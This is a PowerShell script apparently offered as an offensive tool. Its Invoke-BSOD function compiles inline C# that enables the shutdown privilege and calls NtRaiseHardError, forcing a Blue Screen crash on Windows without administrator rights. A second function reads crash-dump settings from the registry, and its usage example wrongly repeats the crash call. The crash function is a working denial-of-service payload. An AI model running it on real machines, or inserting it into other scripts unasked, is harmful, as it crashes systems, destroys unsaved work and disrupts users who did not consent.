function Invoke-BSOD {
<#
.SYNOPSIS

Invokes a Blue Screen of Death on Windows without requiring admin privileges.
Author:  Barrett Adams (@peewpw)

.DESCRIPTION

Raises an error that causes a Blue Screen of Death on Windows. It does this without
requiring administrator privileges.

.EXAMPLE

PS>Import-Module .\Invoke-BSOD.ps1
PS>Invoke-BSOD
   (Blue Screen Incoming...)

#>
$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    [CS]::Kill()
}

function Get-DumpSettings {
<#
.SYNOPSIS

Gets the crash dump settings
Author:  Barrett Adams (@peewpw)

.DESCRIPTION

Queries the registry for crash dump settings so that you'll have some idea
what type of dump you're going to generate, and where it will be.

.EXAMPLE

PS>Import-Module .\Invoke-BSOD.ps1
PS>Invoke-BSOD
   (Blue Screen Incoming...)

#>
	$regdata = Get-ItemProperty -path HKLM:\System\CurrentControlSet\Control\CrashControl

	$dumpsettings = @{}
	$dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {
		1 { if ($regdata.FilterPages) { "Active Memory Dump" } else { "Complete Memory Dump" } }
		2 {"Kernel Memory Dump"}
		3 {"Small Memory Dump"}
		7 {"Automatic Memory Dump"}
		default {"Unknown"}
	}
	$dumpsettings.DumpFileLocation = $regdata.DumpFile
	[bool]$dumpsettings.AutoReboot = $regdata.AutoReboot
	[bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite
	[bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump
	[bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent
	$dumpsettings
}
